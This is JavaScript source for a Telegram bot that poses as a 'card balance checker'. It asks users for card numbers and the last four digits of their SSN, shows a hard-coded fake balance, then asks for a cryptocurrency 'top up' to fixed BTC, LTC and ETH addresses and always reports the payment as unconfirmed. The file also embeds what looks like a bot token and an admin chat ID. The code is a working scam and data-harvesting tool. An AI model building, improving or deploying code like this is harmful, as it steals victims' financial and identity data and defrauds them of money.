const TelegramBot = require('node-telegram-bot-api');

// Bot token from BotFather
const token = '7328142142:AAGXwNfYW9AO24mHGur8LWsdr7XeQJFbDT8';
const adminChatId = 1056383998; // Admin's chat ID for notifications

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

// Object to keep track of users who used the free trial
const userTrials = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;

  if (userTrials[username]) {
    bot.sendMessage(chatId, "🚫 You've already used your free trial. Please top up to continue using the service.");
    displayTopUpOptions(chatId);
    return;
  }

  userTrials[username] = true;
  
  bot.sendMessage(chatId, "👋 Welcome! You have 1️⃣ free trial to check the balance of any card. 🎉");
  setTimeout(() => {
    bot.sendMessage(chatId, "💳 Please enter the card number:");
  }, 2000);
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;
  const text = msg.text;

  if (!userTrials[username]) return;

  if (!userTrials[username].cardNumber) {
    userTrials[username].cardNumber = text;
    setTimeout(() => {
      bot.sendMessage(chatId, "🔒 Now, please enter the last 4 digits of the SSN:");
    }, 2000);
  } else if (!userTrials[username].ssn) {
    userTrials[username].ssn = text;
    setTimeout(() => {
      bot.sendMessage(chatId, "⏳ Checking balance, please wait...");
      setTimeout(() => {
        bot.sendMessage(chatId, "💰 Your card balance is: $2,354.67");
        setTimeout(() => {
          bot.sendMessage(chatId, "💡 To continue using the service, please top up.", {
            reply_markup: {
              inline_keyboard: [
                [{ text: "💳 Top Up Bot", callback_data: 'top_up' }],
                [{ text: "❌ Cancel", callback_data: 'cancel' }]
              ]
            }
          });
        }, 2000);
      }, 11000);
    }, 2000);
  }
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const username = query.from.username;

  if (query.data === 'top_up') {
    bot.sendMessage(chatId, "💲 Minimum deposit is $15. Choose your payment method:", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔶 Pay in BTC", callback_data: 'pay_btc' }],
          [{ text: "🔷 Pay in LTC", callback_data: 'pay_ltc' }],
          [{ text: "⬛ Pay in ETH", callback_data: 'pay_eth' }]
        ]
      }
    });
  } else if (query.data === 'cancel') {
    bot.sendMessage(chatId, "🚫 Operation cancelled. Have a nice day!");
  } else if (query.data === 'pay_btc' || query.data === 'pay_ltc' || query.data === 'pay_eth') {
    const paymentMethod = query.data.split('_')[1].toUpperCase();
    const paymentAddresses = {
      BTC: 'bc1qtuf2dp8yz0dzhn6gsj78vy6sj2huh9vc5fa5u2',
      LTC: 'LWWFYfkDni6G3ByhXq89hD3GRgw9MmCVMd',
      ETH: '0xF11669E62c6fd5dE5f96494119fe37ABc5dFfFB9'
    };
    
    const paymentAddress = paymentAddresses[paymentMethod];
    bot.sendMessage(chatId, `💰 Please deposit any amount above $15 to the following ${paymentMethod} address:`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: `📍 ${paymentAddress}`, callback_data: 'show_address' }],
          [{ text: "✅ Confirm Payment", callback_data: 'confirm_payment' }]
        ]
      }
    });

    // Notify admin about the potential payment
    bot.sendMessage(adminChatId, `🚨 User @${username} is considering a payment in ${paymentMethod}. Address: ${paymentAddress}`);
  } else if (query.data === 'confirm_payment') {
    bot.sendMessage(chatId, "⚠️ Payment not confirmed. Please try again in a moment.");
  }
});

function displayTopUpOptions(chatId) {
  bot.sendMessage(chatId, "🔋 To continue using the service, please top up.", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💳 Top Up Bot", callback_data: 'top_up' }],
        [{ text: "❌ Cancel", callback_data: 'cancel' }]
      ]
    }
  });
}
